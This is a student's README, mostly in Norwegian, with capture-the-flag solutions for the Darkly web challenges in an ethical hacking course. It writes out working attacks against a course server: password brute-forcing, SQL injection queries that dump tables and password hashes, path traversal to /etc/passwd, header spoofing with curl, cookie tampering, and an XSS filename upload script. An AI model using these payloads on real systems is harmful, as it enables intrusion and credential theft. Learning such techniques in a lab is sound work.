# TTM4536-Etisk-hacking

Repo for all code som blir brukt i faget, og spesielt i forhold til flag og Darkly


Flags:
1. [x] Bruteforce
2. [x] Passord-recovery
3. [x] Albatros-flag? nsa?
4. [x] Survey (trenger flag03)
5. [x] Redirect (trenger flag04)
6. [x] Paths
7. [x] Hidden
8. [ ] Whatever
9. [x] Cookies/oreo
10. [x] Members
11. [x] Image
12. [ ] Image2
13. [x] Silly
14. [ ] nsa2


Darkly writeups github:
1. https://github.com/acarlson99/darkly
2. https://github.com/bnoufel/Darkly
3. https://github.com/asarandi/darkly
4. https://github.com/tillderoquefeuil-42-web/darkly
5. https://github.com/acarlson99/darkly



# Bruteforce/Flag01

Lagde et script som kjørte 2 for løkker. Begge løkkene gikkgjennom alle passordene i filen (xato.....) og i den inerste løkken skrev den ut passordene i et passord. Så alle passordene i filen ble satt sammen med alle passordene inkludert seg selv. Det endte totalt med 998001 passord grunnet at det var 999 passord i filen siden et av passordene var blankt som scriptet ikke tok med.

Etter det kjørte jeg det default scriptet med noen små justeringer og fikk ut passordet (chicken333333) for admin.


# Flag02 - Passord recovery
Editerte html coden:
Ved å legge inn eget e-post i value i stede for den som lå der orginalt
```
<form action="#" method="POST"> 
    <input type="hidden" name="mail" value="eirikgba@stud.ntnu.no" maxlength="15"> 
    <input type="submit" name="Submit" value="Submit"> 
</form>
```


# Flag03 - Albatros/NSA flag
``` 
curl -A "61c08546b939" -e "https://www.nsa.gov/" http://129.241.200.165:19680/index.php?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c
```

# Flag04 - Survey
```
http://129.241.200.165:19680/?page=survey
<form action="#" method="post">
					<input type="hidden" name="sujet" value="2">
					<select name="valeur" onchange="javascript:this.form.submit();">
						<option value="1">1</option>
						<option value="2">2</option>
						<option value="3">3</option>
						<option value="4">4</option>
						<option value="5">5</option>
						<option value="6">6</option>
						<option value="7">7</option>
						<option value="8">8</option>
						<option value="9">9</option>
						<option value="999999">10</option>
					</select>
				</form>

```
Change the value of one of the Grades

2^Grade mod p = FLAG03 mod 2^64,
Where
p = Next_Prime(2^54)

# Flag05
Redirect the webpage til en annnen side
```
http://129.241.200.165:19680/index.php?page=redirect&site=5650cb0
```

# Flag06
Endre page, ved å gå til root og så inn i directory etc og vidre inn i passwd.
Hentet opp deller av flagget når en går bakover i fil systemet og det siste ligger i etc/passwd
```
http://129.241.200.165:19680/index.php?page=../../../../../../../etc/passwd
```


# Flag07
Flag07: dbfa4f7c46dc570fcd4b71272cdd2f2c
First tok jeg ut alle README filene
``` 
wget -m -r -nd -A "*README*" http://129.241.200.165:19680//.hidden/ 
```
Så merge alle filene sammen til en fil og åpne den filen i notepad
```
cat * > merged-file
explorer.exe .			#åpner directory i file explorer windows
```

# Flag08

ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890
http://129.241.200.165:19680/whatever/
htpasswd:
	root:sha256('eirikgbaPutHereSomeExtraChars')=........................................................xxxxxxxx
	xxxxxxxx = Rightmost 8 chars of <Traversal of .hidden folder Flag07>

http://129.241.200.165:19680/admin/index.php



# Flag09 - cookie
satoshi 65558: 22c9b7866d7424dc4b90a03664f5136c966fb34c8edd751cfba6998fe2b5170f
```
inspect element

document.cookie

https://www.blockchain.com/btc/block/65558

endre cookie til 000000000a7dce5ac40e7a88fd61399bbe76da161c1d65cbc2ebf2bd364545ed
```

# Flag10
Flag10: cfd650ecf156952e7764710e18c0b4fcb2179e3c48ac922ee4bb1d3d2210e8 

https://onlinehextools.com/xor-hex-numbers 

```
1 union select null, concat(table_name) from information_schema.tables where table_schema=database()
1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
1 AND 1=2 UNION SELECT user_id99, CONCAT(first_name64, last_namecc, birthdate, email60, town91, country3e, comment92, HashedPassword) FROM clients

1 AND 1=2 UNION SELECT HashedPassword, CONCAT(user_id99, first_name64, last_namecc, birthdate, email60, town91, country3e, comment92) FROM clients
1 AND 1=2 UNION SELECT HashedPassword FROM clients

0781eeb28b88a1b9d57388163ae891fe6755096c34f24884584eb4d5b0842934
072472842cce7d49595202c4ceb061b7337282864ac89fc83444593e0f71ad37
0755d3f6381ba4680d8588e7512cb0707f35e24477cd0156dfe45a34ef105d3e
079db43068890999ad85c21f7a56f7fe82508731e44bd6ad6d00fa4910bc39d2
074500f0050818df67488ee3e29503943dea2c86820b58c41593dc9952b23e9c
07c08821b0d263eabdde23e00c823472f526961fd560da47ebf034f8293525ad
0708aac80014e6cf173f1ba0e31ebe5217a75e655e6c59dc4e324241902e058e
07d888eac2e9817b4b5834f7871dd3e2355fc3f4e4fa6ce597c592f608e7dd34
07ec866e79bf675f90d3b97ab11fa871a7e6de7e9dfd703b9c81b97e1a974163
077b1d907c1af5cb9d2de0efad16c9e16d31155ccf4758fd653d33eb6e3b59c1
0736236dc3a811b092f43b806392e25b9ebfa65ab101b21b79b1860a589f0a85
0721b9be8480d9b9903755dba557221014ae31493fdb3ad51ff4afea93cb811e
0774d2aaffaf19f5d2b1cb1ba7fdd2a2b21677e3f82df719fcc05195afc8ff37
077c9d60af001f30ec5001412032a063708a6dfdccc633947c254ded30488669
073ea70c5623d9d8ee55221503e3aba85085612da5237c32e3771da39493f6e2
07dfa45244586cd55f085b554182f5a82a112b81ad4e9472a6d6b73cc825fffc
07c5c4b9dc9b1ad195a46d25e656fdc5d6fb174eafbb80d6fbe052ddb783d787
0716688c4b1209a93986268d70cfa9b6e09168e263720cb81f816e81313b1cbf
07ac6d98121346f110c7c072eada56d829e5895e56e93eca6887ed926f90c960
0718ec8dd16d5a9f10605f04a32b1a68d4bc4321b49ccec52174bb16c24980b9
07621d8201c3ae1c7e5b403dffee899ca9062e5dd9083f9ad9a2df34235fbce0
071cac57e5729a08e04e99560131f39d4d3349a21ccb7de204887b3cfe67ad76
07baba47112ed595f72c90bf6da9c3995024f7d14306633f542e7a895841686d
0716830d9e3a1e5267115ff7f341e68cd4a5563f8a4f212405bdd685c5cf7c9c
07b1faa60739edbe200c2909a4e61757fb63fedd38c7d897dc3f012e885cf720
079e1255e419023fb127df6d9eac15b434ee2451107ddd6176749e61c4b4867a
07f1f2d0aa7bee909f1f74afaa5a1356f385fab15a412cac58bbb7164445fb8b
07fbb71f80b6d56558fb02111c296a500702d02ba3621f6f34564e3f499617f3
076c5daac63cda2742f1ae1570ff56a0f970bbfd86ee484c2ad790ea82bf17f5
0717b2882987bd5ae8e4cd9bc70e4f2ae2890df4317f6f5ed3ce864e70f2a97f
076062b9678f68b21515965d0d4e85da34da4bad65faeb8fbaca8baae8308f57
07a87c0353fa07960b6c3ecb593381f7f29d5e1f0b4eea8da5228be123c2a772
0799878f5f6365c0b61b3683aefec65cff5bf3b373da9f30dd0728acace3147b
0707c88b56cb8c4a1411d4e61d50a60e0db86f5dbb98f0242d660eaf54a282cf
0779df153e311abd1648885a219360c41a8b37dd5544c6949c4629aaa13b5532
075aa3e076b30d9ff06a41db069b813ce25159d66b6352fde078c633a8d29f78
```

# Flag11
Flag11: d843efc41266a0cc502dc23b149e5c95

ID: 1=1 UNION SELECT comment12, titlec4 FROM images 
Title: saepe
Url : To find Flag11, use 16 leftmost characters of the Cookie Tampering Flag09 and download the file 3d8e5368ff73ab88cdccd05a07e1e19e.bin

http://129.241.200.165:19680/?page=searchimg
	glb eller gltf binary fil?

```
1=1 UNION SELECT table_schema, table_name FROM information_schema.tables
1=1 UNION SELECT table_name, column_name FROM information_schema.columns
1=1 UNION SELECT CONCAT(downloads66, comment12, id43, urlef), titlec4 FROM images	
	#id=17655
	#download=5626031
	#title: saepe
	#url: http://mosciski.biz/someplace.jpg 
	#flag09: 07580b873bc9eb153f4f346c415421e1
	#16 leftmost char of Flag09: 07580b873bc9eb15
1=1 UNION SELECT id, url FROM list_images

http://129.241.200.165:19680/index.php?page=searchimg&id=1%3D1+UNION+SELECT+CONCAT%28downloads66%2C+comment12%2C+id43%2C+urlef%29%2C+titlec4+FROM+images&Submit=Submit#
http://129.241.200.165:19680/index.php?page=download

```

### KALI VM - steganography
```
git clone https://github.com/raffg/steganography.git
cd steganography

pip install Pillow
pip install image

python3 -m pip install image

python3 steganography.py drown.png

open unmerged.png
```


# Flag12 - image upload
http://129.241.200.165:19680/?page=upload# 

Nice try but should be the image name extracted from SEARCH IMAGE attack
		saepe ?
		3d8e5368ff73ab88cdccd05a07e1e19e.bin ?

```
#!/usr/bin/env python3

import requests

url = 'http://129.241.200.165:19680/?page=upload'

f = {
        'uploaded':                                 # .. from <form> element in html
            ("<script>alert('xss')</script>",       # file name
                'file_contents',                    # actual file contents, normaly `open(fn, 'rb')`
                'image/jpeg')                       # content-type
        }

d = {
        'Upload': 'Upload'                          # from <form> element in html
        }

r = requests.post(url, files=f, data=d)
print(r.text)
```

# Flag13
Congratulations Flag13 is 6bad301f529ea136b3427e9daf2e6b2e
```
http://129.241.200.165:19680/test.php
```

# Flag14

